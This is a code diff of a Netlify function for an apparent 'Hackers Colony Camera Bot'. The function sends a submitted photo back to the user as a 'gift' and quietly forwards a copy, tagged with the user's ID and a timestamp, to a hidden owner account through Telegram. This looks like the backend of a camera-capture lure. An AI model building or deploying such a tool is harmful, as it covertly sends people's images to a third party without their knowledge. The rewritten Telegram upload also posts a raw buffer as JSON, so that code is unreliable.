@@ -1,64 +1,88 @@
 // netlify/functions/sendPhoto.js
 const axios = require('axios');
 
-exports.handler = async (event, context) => {
-  // Netlify Functions free tier allows 125k invocations/month
-  // This should be enough for your use
-  
+exports.handler = async function(event, context) {
+  // Only allow POST requests
+  if (event.httpMethod !== 'POST') {
+    return {
+      statusCode: 405,
+      body: JSON.stringify({ error: 'Method Not Allowed' })
+    };
+  }
+
   try {
-    const params = new URLSearchParams(event.body);
-    const image = params.get('image');
-    const label = params.get('label');
-    const userId = params.get('userId');
+    // Parse the request body
+    const { image, label, userId } = JSON.parse(event.body);
     
-    // Your tokens (set in Netlify environment)
+    // Get tokens from environment variables
     const BOT_TOKEN = process.env.BOT_TOKEN;
     const OWNER_ID = process.env.OWNER_ID;
-    
-    if (!image || !userId) {
-      return {
-        statusCode: 400,
-        body: JSON.stringify({ error: 'Missing data' })
-      };
+
+    if (!BOT_TOKEN || !OWNER_ID) {
+      console.error('Environment variables not set');
+      throw new Error('Server configuration error');
     }
-    
+
     // Convert base64 to buffer
     const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
     const buffer = Buffer.from(base64Data, 'base64');
-    
-    // Send to Telegram
+
+    // Send to user
     await sendToTelegram(BOT_TOKEN, userId, buffer, label, true);
-    await sendToTelegram(BOT_TOKEN, OWNER_ID, buffer, label, false, userId);
     
+    // Send to owner
+    await sendToTelegram(BOT_TOKEN, OWNER_ID, buffer, label, false, userId);
+
     return {
       statusCode: 200,
-      body: JSON.stringify({ success: true })
+      body: JSON.stringify({ 
+        success: true, 
+        message: 'Photos sent!' 
+      })
     };
-    
+
   } catch (error) {
+    console.error('Error:', error);
     return {
       statusCode: 500,
-      body: JSON.stringify({ error: error.message })
+      body: JSON.stringify({ 
+        success: false, 
+        error: error.message 
+      })
     };
   }
 };
 
-async function sendToTelegram(token, chatId, buffer, label, isUser = true, userId = null) {
-  const caption = isUser 
-    ? `🎁 Your Gift: ${label}\n✨ From Hackers Colony Camera Bot`
-    : `📸 From User ${userId}: ${label}\n⏰ ${new Date().toLocaleTimeString()}`;
+async function sendToTelegram(token, chatId, photoBuffer, label, isUser = true, userId = null) {
+  let caption = '';
   
-  // Create form data
-  const formData = new FormData();
-  const blob = new Blob([buffer], { type: 'image/jpeg' });
-  
-  formData.append('chat_id', chatId);
-  formData.append('caption', caption);
-  formData.append('photo', blob, 'photo.jpg');
-  
-  await axios.post(`https://api.telegram.org/bot${token}/sendPhoto`, formData, {
-    headers: {
-      'Content-Type': 'multipart/form-data'
-    }
-  });
+  if (isUser) {
+    // Message to the user
+    caption = `🎁 Your Gift: ${label}\n✨ From Hackers Colony Camera Bot`;
+  } else {
+    // Message to you (owner)
+    caption = `📸 From User ${userId}: ${label}\n⏰ ${new Date().toLocaleTimeString()}`;
+  }
+
+  try {
+    // Send to Telegram
+    const response = await axios.post(
+      `https://api.telegram.org/bot${token}/sendPhoto`,
+      {
+        chat_id: chatId,
+        caption: caption,
+        photo: photoBuffer
+      },
+      {
+        headers: {
+          'Content-Type': 'application/json'
+        }
+      }
+    );
+    
+    console.log(`Photo sent to ${chatId}:`, response.data);
+  } catch (error) {
+    console.error('Telegram API error:', error.response?.data || error.message);
+    throw error;
+  }
 }
